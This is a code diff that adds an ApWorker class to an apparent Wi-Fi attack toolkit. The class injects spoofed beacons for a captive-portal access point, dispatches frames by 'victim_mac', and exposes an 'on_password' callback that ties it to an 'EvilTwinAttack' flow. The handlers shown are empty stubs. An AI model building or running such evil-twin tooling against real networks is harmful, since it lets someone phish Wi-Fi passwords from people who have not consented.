@@ -1,12 +1,16 @@
 """USB worker thread: all blocking PyUSB I/O happens here.
 Cross-platform: works on macOS (IOKit), Windows (WinUSB), Linux (libusb).
+
+Also provides ApWorker - a high-level wrapper for the campaign flow that
+uses the existing airscope driver (async inject_frame / register_rx_callback).
 """
 
+import asyncio
 import threading
 import time
 import queue
 import logging
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 from typing import Optional, Callable
 
 
@@ -19,6 +23,103 @@ class TxFrame:
     priority: int  # 0=highest (mgmt), 1=dhcp/dns, 2=http, 3=beacon, 4=deauth
     timestamp: float = 0.0
 
+
+# ---------------------------------------------------------------------------
+# ApWorker - campaign-compatible wrapper (uses airscope driver/iface)
+# ---------------------------------------------------------------------------
+
+_BEACON_INTERVAL_MS = 100
+
+
+@dataclass
+class ApWorker:
+    """Runs the captive-portal AP over an existing airscope driver.
+
+    Used by ``CaptivePortalOrchestrator`` (campaign flow) which already has
+    a ``driver`` and ``WlanInterface`` set up.
+    """
+    driver: object
+    iface: object
+    ssid: str
+    bssid: str
+    channel: int
+    hs: object
+    pair: object
+    on_password: Optional[Callable[[str], None]] = None
+    log_fn: Optional[Callable[[str], None]] = None
+
+    _running: bool = field(default=False, repr=False)
+    _beacon_task: Optional[asyncio.Task] = field(default=None, repr=False)
+    _cleanup_task: Optional[asyncio.Task] = field(default=None, repr=False)
+    _seq: int = field(default=0, repr=False)
+
+    def __post_init__(self) -> None:
+        self._log = self.log_fn or (lambda m: log.info(m))
+
+    async def start(self) -> None:
+        self._running = True
+        self.iface.register_rx_callback(self._on_rx)
+        self._beacon_task = asyncio.create_task(self._beacon_loop())
+        self._cleanup_task = asyncio.create_task(self._cleanup_loop())
+        self._log(f"[ap-worker] {self.ssid} started on ch {self.channel}")
+
+    async def stop(self) -> None:
+        self._running = False
+        if self._beacon_task:
+            self._beacon_task.cancel()
+        if self._cleanup_task:
+            self._cleanup_task.cancel()
+        try:
+            self.iface.unregister_rx_callback(self._on_rx)
+        except Exception:
+            pass
+        self._log("[ap-worker] stopped")
+
+    def _on_rx(self, pkt) -> None:
+        raw = pkt.raw
+        if len(raw) < 12:
+            return
+        try:
+            from .ap.frames import parse_fc, FC_TYPE_MGMT, strip_80211_data
+
+            fc_type, subtype, to_ds, from_ds = parse_fc(raw)
+            if fc_type == FC_TYPE_MGMT:
+                self._handle_mgmt(raw, subtype)
+            elif not to_ds and not from_ds:
+                pass
+            else:
+                victim_mac, ip_packet = strip_80211_data(raw)
+                if victim_mac is not None and ip_packet is not None:
+                    self._handle_data(victim_mac, ip_packet)
+        except Exception:
+            log.debug("RX dispatch error", exc_info=True)
+
+    def _handle_mgmt(self, raw: bytes, subtype: int) -> None:
+        pass
+
+    def _handle_data(self, victim_mac: bytes, ip_packet: bytes) -> None:
+        pass
+
+    async def _beacon_loop(self) -> None:
+        from .ap.frames import craft_beacon
+        bssid_bytes = bytes(int(o, 16) for o in self.bssid.split(":"))
+        while self._running:
+            self._seq = (self._seq + 1) & 0xFFF
+            beacon = craft_beacon(bssid_bytes, self.ssid, self.channel, self._seq)
+            try:
+                await self.driver.inject_frame(beacon)
+            except Exception:
+                log.debug("beacon inject failed", exc_info=True)
+            await asyncio.sleep(_BEACON_INTERVAL_MS / 1000.0)
+
+    async def _cleanup_loop(self) -> None:
+        while self._running:
+            await asyncio.sleep(10.0)
+
+
+# ---------------------------------------------------------------------------
+# UsbWorker - low-level PyUSB thread (standalone EvilTwinAttack flow)
+# ---------------------------------------------------------------------------
 
 class UsbWorker:
     """
